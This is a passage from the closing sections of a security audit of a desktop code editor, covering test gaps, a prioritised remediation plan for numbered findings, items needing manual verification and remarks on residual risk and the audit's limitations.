* `app::print_temp_file_is_fresh_and_private`
* `tests/visual/lsp-trust.sh`

Gaps:
* There is no headless `ApexApp` harness, so trust gating, branch
  arguments and dialog behaviour are tested only end to end.
* There is no fuzz target for `parse_patch`, the forge URL parser or the
  history log parser (all parse git or repository output).
* The end-to-end scripts click fixed coordinates. A stray Xvfb display with
  a different size made them fail during this audit.

## 20. Prioritised Remediation Plan

* **Immediate:** none outstanding; SA-01 to SA-09 are fixed and committed.
* **Short term:**
  * Re-enable CI (billing), then pin actions by SHA (SA-11).
  * Add a "Trust this folder?" button to the language-server status
    message, so users do not have to find the menu.
* **Medium term:**
  * Zeroise credential buffers (SA-10).
  * Canonicalise trust paths and explain subfolder scope (SA-12).
  * Add fuzz targets for the git output parsers.
* **Long term:**
  * Sign and notarise releases, and publish checksums (SA-17).
  * An explicit Windows DACL for the runtime directory (SA-15).
  * Optional OS sandboxing for language servers.

## 21. False Positives / Needs Manual Verification

* **macOS panel code** (`macos_dialogs.rs`) is type-checked but has not run
  on a Mac. Its safety argument (blocks run on the main run loop, panel not
  retained by its handler) should be confirmed under Instruments.
* **SA-05** was assessed as failing closed for attacker-owned directories;
  the symlink case was reasoned, not reproduced.
* **The LSP gate test** was run with the fix only; it was not re-run against
  the old code to watch it fail.
* **`git2` 0.21:** the end-to-end script covers status, blame, log, branches,
  diffs and history. Repositories with non-UTF-8 file names were not tested.

## 22. Final Notes

Residual risk is concentrated in two places. The first is the trust
decision: once trusted, a folder can run code, by design. The second is
same-user local compromise, which no desktop editor can resist. Every
program-running path now checks trust, every shared-temp write is private
and unguessable, and the dependency tree has no known advisories.
Limitations: a single reviewer; macOS and Windows behaviour was checked by
cross-compilation, not by execution; no third-party penetration test.
